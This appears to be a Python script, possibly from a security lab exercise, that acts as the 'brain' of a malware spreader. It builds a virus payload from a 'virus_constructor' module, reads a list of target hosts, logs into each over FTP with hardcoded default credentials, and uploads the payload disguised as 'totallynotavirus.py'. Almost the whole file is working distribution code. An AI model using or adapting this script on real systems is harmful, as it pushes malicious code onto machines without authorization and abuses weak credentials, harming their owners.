from ftplib import FTP
import io
import os
import virus_constructor as vc


file = str(vc.compiled_code())
print(file)
#file = "print('Hello World!!')"
#print(file)




def uploadFile(ftp,filename,data):
    #I changed to using strings to send data because you will be
    #making your virus as a string and there is no need to save it to
    #a file locally just to send
    ftp.storbinary('STOR ' + filename, io.BytesIO(data.encode()))


targets=[]
f=open("/root/brain/targets.txt","r")
for l in f.readlines():
    targets.append(l.strip())
f.close()
    
print("Brain started")
for t in targets:
    print ("Sending test file to %s"%t)
    ftp = FTP('')
    ftp.connect(t, 21)
    ftp.login('user', '12345')
    uploadFile(ftp,"totallynotavirus.py", file)
    # uploadFile(ftp,"totallynotavirus.py",
    ftp.quit()
    # ftp.cwd('/home/username')  # directory for shenanigans
    # ftp.retrlines('LIST')




# def downloadFile():
#     filename: str = 'testfile.txt'  # replace with download file
#     localFile = open(filename, 'wb')
#     ftp.retrbinary('RETR ' + filename, localFile.write, 1024)
#     ftp.quit()
#     localFile.close()


# if __name__ == '__main__':
#     uploadFile()
#     # downloadFile()



#Commented out for now
